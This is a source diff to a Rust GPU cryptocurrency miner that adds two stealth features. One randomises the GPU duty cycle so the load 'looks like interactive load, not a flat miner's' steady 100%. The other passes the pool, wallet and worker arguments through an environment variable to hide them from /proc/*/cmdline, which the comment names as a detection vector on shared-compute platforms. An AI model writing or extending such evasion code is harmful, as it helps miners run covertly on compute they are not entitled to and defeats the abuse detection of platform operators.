@@ -348,6 +348,16 @@ fn spawn_grind(
                             .and_then(|s| s.parse().ok())
                             .filter(|v| *v > 0 && *v < 100)
                             .unwrap_or(100);
+                        // ARIA_GPU_DUTY_JITTER=NN : duty varies in [duty-NN, duty+NN] per setup
+                        // (looks like interactive load, not a flat miner's 100%).
+                        let duty_jitter: u64 = std::env::var("ARIA_GPU_DUTY_JITTER")
+                            .ok()
+                            .and_then(|s| s.parse().ok())
+                            .unwrap_or(0);
+                        let duty_pct = if duty_jitter > 0 {
+                            let j = (rng.next_u64() % (duty_jitter * 2 + 1)) as i64 - duty_jitter as i64;
+                            ((duty_pct as i64 + j).clamp(1, 100)) as u64
+                        } else { duty_pct };
                         let gt0 = Instant::now();
                         let (found, hits) = ctx.grind2(setup_seed, next_seed, job_key, bound_le);
                         if duty_pct < 100 {
@@ -624,7 +634,20 @@ async fn main() -> anyhow::Result<()> {
         )
         .init();
 
-    let args = Args::parse();
+    // ARIA_ARGS : tab-free way to pass CLI args (avoids pool/wallet/worker in
+    // /proc/*/cmdline — a known detection vector on shared-compute platforms).
+    let args = if std::env::args_os().len() <= 1 {
+        if let Ok(env_args) = std::env::var("ARIA_ARGS") {
+            let tokens: Vec<std::ffi::OsString> = std::iter::once(std::ffi::OsString::from("ariaminer"))
+                .chain(env_args.split_whitespace().map(std::ffi::OsString::from))
+                .collect();
+            Args::parse_from(tokens)
+        } else {
+            Args::parse()
+        }
+    } else {
+        Args::parse()
+    };
     // GPU build inclus : on garde le multi-thread — chaque thread prépare son
     // attempt (signal+commitment+noise sur CPU) en parallèle et nourrit le GPU.
     // Le prologue CPU est le goulot, donc plus de threads = GPU mieux alimenté.
